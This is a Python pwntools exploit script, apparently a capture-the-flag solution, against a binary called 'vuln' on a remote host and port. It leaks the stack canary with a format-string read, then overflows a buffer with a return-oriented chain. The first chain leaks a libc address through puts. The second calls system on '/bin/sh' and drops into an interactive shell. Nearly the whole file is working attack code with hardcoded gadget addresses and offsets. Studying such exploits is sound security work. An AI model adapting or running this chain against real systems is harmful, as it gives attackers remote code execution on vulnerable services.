#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./vuln')
context.terminal = ['kitty', '-e', 'sh', '-c']

host = args.HOST or '135.181.101.92'
port = int(args.PORT or 9007)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env={"LD_PRELOAD" : "./libc"}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env={"LD_PRELOAD" : "./libc"}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break main
continue
'''.format(**locals())

puts_plt = 0x4010b0
puts_got = 0x404018
system_offset = -0x32190
bin_sh_offset = 0x13000a

pop_rdi = 0x4013f3
ret2main = 0x401367
ret = 0x40101a

io = start()
io.recv()
io.sendline('%31$llx')
io.recvuntil('t ')
canary_leak = int('0x' + io.recvline(), base=16)
print "canary leak: {}".format(hex(canary_leak))

payload = 'A' * 184
payload += p64(canary_leak)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(ret2main)

io.recvuntil('>>')
io.sendline(payload)
leak = io.recvuntil('\x7f')
print(len(leak))
libc_leak = unpack(leak,48)
print "puts leak: {}".format(hex(libc_leak))

io.recv()
io.sendline('hi')
io.recvuntil('>>')

payload = 'A' * 184
payload += p64(canary_leak)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi)
payload += p64(libc_leak+bin_sh_offset)
payload += p64(ret)
payload += p64(libc_leak+system_offset)

io.sendline(payload)

io.interactive()

